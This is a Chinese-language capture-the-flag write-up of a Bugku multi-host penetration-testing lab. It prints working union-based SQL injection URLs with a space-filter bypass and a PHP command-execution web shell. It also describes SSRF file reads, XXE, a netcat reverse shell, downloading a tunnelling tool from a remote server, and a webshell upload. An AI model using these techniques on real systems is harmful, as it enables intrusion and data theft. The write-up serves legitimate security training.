Bugku的PAR模式，渗透测试3，共8个flag，这次打靶挺轻松，感觉比较简单，一次过，嘿嘿。在此，分享出来笔者的过程，并呈现自己的思考，同时也希望能获得大佬的指点。

## 0x01 flag1 （ssrf）

![](../Images/9d462aa71d9f21ef20d419133d0e2e6f.png)  
开启靶场，依旧是给了个ip:80，不过题目给了个打进内网的提示，  
先上nmap扫一下  
![](../Images/6dcbe2e369cf2f677be4240ecb7d5605.png)  
从80端口开始吧，访问80端口  
![](../Images/8db3ab13e51c55503d8ebe2a8e408ba4.png)  
一个站点快照获取的功能，其实打过ctf的都知道这应该会有ssrf漏洞，  
那么在已知这是一个php站点，且有着ssrf漏洞的情况下，我们应该如何利用呢？

```




http://：探测内网主机存活、端口开放情况
```

先利用file协议看一下当前源代码，填入file:///var/www/html/index.php，右键点击查看页面源代码，发现源码  
![](../Images/d510167a584ae322023da6cf01b4751a.png)  
能看到源码就证明了我们之前的猜想是正确的，那么现在我们就已经可以直接读取当前机子里边的flag了，让我猜猜看，flag在根目录下  
![](../Images/8ec1d18788412a12e65de608e5891010.png)

## 0x02 flag2、flag3（shell.php）

题目给了个提示  
![](../Images/542f80d6abc4d29b6660cf87199e19cd.png)  
但是暂时不太明白有什么用，继续利用file协议查看一下当前机子的网络信息  
![](../Images/59b281f46a4a3a299f6750ee6ea13b7b.png)  
提示有一个192.168.0.2/24网段，填入http://192.168.0.1，然后抓包爆破最后一位数，通过返回包长度来探测局域网内有哪些机子开了80端口  
![](../Images/e9f35679df60817cf31f89d11f2a80bf.png)  
根据返回长度，可以直接判断出来这个网段里有四台不同的机子，回到web界面，看看http://192.168.0.10的快照  
![](../Images/e2d82b06f3b8e7771bb443f98ed68e52.png)  
嘿，这是挂了个黑页是吧，页面源代码也没有什么东西  
![](../Images/4fca21b6611eb1bfa1cdb1e724ee6293.png)  
用burp抓到获取快照的请求包，然后发送到Intruder爆破一下目录看看，  
![](../Images/2d204909f5bdc4a42226b826fba8e143.png)  
根据返回包长度发现那个站点有shell.php文件，根据返回包可以知道该文件大致内容为

```

<?php system($_GET['cmd']);?>
```

直接cmd传参执行命令，看看当前目录，和根目录下  
![](../Images/bcc9e91e28c51bbac98a2776273cac5c.png)  
![](../Images/243787ea15b5dcc6480ed58193ce4c4e.png)  
拿下两个flag  
![](../Images/7a04b948b2491da662e7cd762d0cd6d8.png)

## flag4（sql注入）

还记得之前爆破探测出来的url里还有两台机子，按顺序来，先看看192.168.0.138  
![](../Images/0c8162a663cca7ae358526b18a26e98e.png)  
估摸着是sql注入，查看源代码知道这是get传参id  
![](../Images/e129dad4404aadf5c4087adfa3f53c08.png)  
输入一个1' or 1=1#进去发现有问题  
![](../Images/1c6a5f4f9078a115ae507bb49dd83675.png)  
经过一段时间的fuzz后，发现这个过滤了空格，选用+代替空格从而绕过，先看一下回显点

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,2,3,4
```

![](../Images/c7c8192a6dd0d484e690496e0889c11d.png)  
查数据库名

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,database(),3,4
```

![](../Images/6710e103be123226e4bfa17ca3d00855.png)  
接下来查表名，因为只能显示一行的数据，所以我们需要用order by来获取更多的数据，order by 1查出的表名为double

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,database(),3,TABLE_NAME+from+information_schema.tables+where+TABLE_SCHEMA="bugku_sql"+order+by+1
```

![](../Images/a76f3a3c681b612e711a8bead07b739e.png)  
order by 2 查出的表名为flag，那么flag应该就在这个表里了吧  
![](../Images/636067d50b52a5f9c96f303b631fe8de.png)  
继续查列名，比较幸运，order by 1就是flag

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,database(),3,COLUMN_NAME+from+information_schema.COLUMNS+where+TABLE_SCHEMA="bugku_sql"+and+TABLE_NAME="double"+order+by+1
```

![](../Images/0bb0f0e1ad0e54afe1961eb0b72635e8.png)  
直接出flag

```

http://192.168.0.138/?id=-1+and+1=2+union+select+1,database(),3,flag+from+bugku_sql.flag
```

![](../Images/b4abef8a86e57d5834d128ae737d10b0.png)

## flag7、flag8（xxe）

最后一台机子是192.168.0.250，获取快照是一个登录界面，通过ssrf去做这个不是很方便，回顾之前有一台被黑了的可以执行任意命令的机子，先看看命令ls /usr/bin  
![](../Images/334e9c585d9f5cd82fa4398b87b29397.png)  
有wget命令，先从公网vps上下载frpc，想挂一个代理开个socks5隧道，方便后续的操作，结果发现这样，添加不了执行权限  
![](../Images/05e4cc4b92c0472723b3bcbaf232d5b2.png)  
![](../Images/d7650e01eef4cbba310e51fd1dba0acb.png)  
看来得先试试反弹shell，在用户命令中看到了nc  
使用nc进行shell反弹  
![](../Images/3edd80ae411fd9f0c8ed3b8e11937c8a.png)  
接收到shell后，再给frpc加上执行权限，这次成功了  
![](../Images/3d3fe429a118a473575b7a7f10e3bffd.png)  
顺利搭建隧道，访问192.168.0.250  
![](../Images/07e0b980ea1cb1c439a5064c4d884fe4.png)  
尝试一波弱口令admin/admin，登录成功，但是并没有进行跳转，依旧留在了当前页面  
![](../Images/1b89c06976c95868db8f87c246b1874f.png)  
嗯，有点迷，抓包看看返回包  
![](../Images/316678bcc6cf109ea18fe84ac955aad1.png)  
嘿，你说这个像不像xxe，盲猜flag在当前目录和根目录下，直接读，成功拿下  
![](../Images/5f636f86b6a81fa24b66ac4f9c685c01.png)  
![](../Images/2e8fecdb610666700b876dba7fc99579.png)

## flag5、flag6（内网）

提交完上面的flag后发现这是flag7、和flag8呀，好家伙我的flag5和flag6呢？  
![](../Images/0ba5287d2760ed17d357e66d63562f68.png)  
回顾之前的四台机子，只有192.168.0.10这台咱们能拿下shell，要不看看内网？  
![](../Images/ffa08b5c5bc5cacd37af67448f50131b.png)  
果然还有一层网段为10.10.0.5/24  
上fscan扫一下，但是扫不出任何信息  
![](../Images/837adfc7627fe4efa4fb000f03541832.png)  
这就有点离谱了，为啥呢，我不理解呜呜呜  
之后换了种方式，使用proxychains4转到kali用nmap扫一下  
![](../Images/62d5678343677f6f0575e49c1abdb921.png)  
这下扫出来一台10.10.0.22:80，不过为什么fscan会扫不出来呢，还是不明白  
之前已经挂上frp代理开了socks5隧道了，所以浏览器直接访问10.10.0.22:80  
![](../Images/d4509b30f27dd157bfb48cea90c3804d.png)  
使用kali自带工具dirb扫一波目录，扫出来admin.php，需要登录，依旧是弱口令admin/admin  
![](../Images/ca1b7487882cdb16511b59651ade3693.png)  
登录后跳转到了首页，细心的我们可以发现这是我们已经有了编辑权限  
![](../Images/a99d35383d2895ba24b375be55555653.png)  
点击管理  
![](../Images/01019ad6fd39b0384ff903dfb5fc67e9.png)  
里边有一个文件夹管理，点进去看看  
可以上传文件  
![](../Images/e4bf7d065baca60864654f09aea7c5fa.png)  
![](../Images/371e8700212eee1c9c68a99fd54b6e24.png)  
当前是media目录看看files目录，  
![](../Images/f12de6faee528ecfa3868f228ae3cb7c.png)  
就俩文件，看看.htaccess文件，发现只解析php后缀的文件  
![](../Images/2f3a691206b903b99e01a803de80d085.png)  
直接上一句话木马加蚁剑，在根目录和网站根目录下拿到最后两个flag  
![](../Images/fab3dbaccf338a4954eaea2922546388.png)
